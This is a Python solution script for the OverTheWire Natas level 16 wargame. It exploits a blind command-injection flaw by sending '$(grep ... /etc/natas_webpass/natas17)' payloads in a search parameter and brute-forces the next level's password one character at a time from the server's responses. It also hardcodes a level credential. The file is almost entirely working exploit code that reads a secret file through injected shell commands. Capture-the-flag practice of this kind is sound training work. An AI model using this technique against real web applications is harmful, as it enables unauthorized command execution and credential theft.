import requests
import string

BASIC_AUTH_USER = 'natas16'
BASIC_AUTH_PASSWORD = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

def generate_characters_dictionary():
    alpha_numeric_string = string.ascii_letters + string.digits
    dictionary = []
    for single_character in alpha_numeric_string:
        # rafters has single occurence in dictionary
        # how this is going to work
        # this will return 'rafters' in response when given character has not beed found in password, that is because
        # inner grep won't append character to `rafters` word so outer grep will be able to correctly find it in dictionary
        # but if for example character `b` exist in password then it will be added to `rafters` making it
        # brafters -> and this does not exist in dictionary so we have a match
        word = '$(grep {} /etc/natas_webpass/natas17)rafters'.format(single_character)
        payload = {'needle': word}
        response = requests.get ('http://natas16.natas.labs.overthewire.org/', auth=(BASIC_AUTH_USER, BASIC_AUTH_PASSWORD), params=payload)
        response_text = response.text
        if "rafters" not in response_text:
            dictionary.append(single_character)
    return dictionary


def find_password():
    dictionary = generate_characters_dictionary()
    print(dictionary)
    password_found = False
    password = ''
    while password_found is False:
        for single_character in dictionary:
            new_password = password + single_character
            param = '$(grep ^{} /etc/natas_webpass/natas17)rafters'.format(new_password)
            payload = {'needle': param}
            response = requests.get('http://natas16.natas.labs.overthewire.org/', auth=(BASIC_AUTH_USER, BASIC_AUTH_PASSWORD), params=payload)
            response_text = response.text
            if "rafters" not in response_text:
                password = new_password
                print('Password so far: ', password)
                # all previous password were 32 in length
                if len(password) == 32:
                    password_found = True
                break
    print('Password: ', password)

find_password()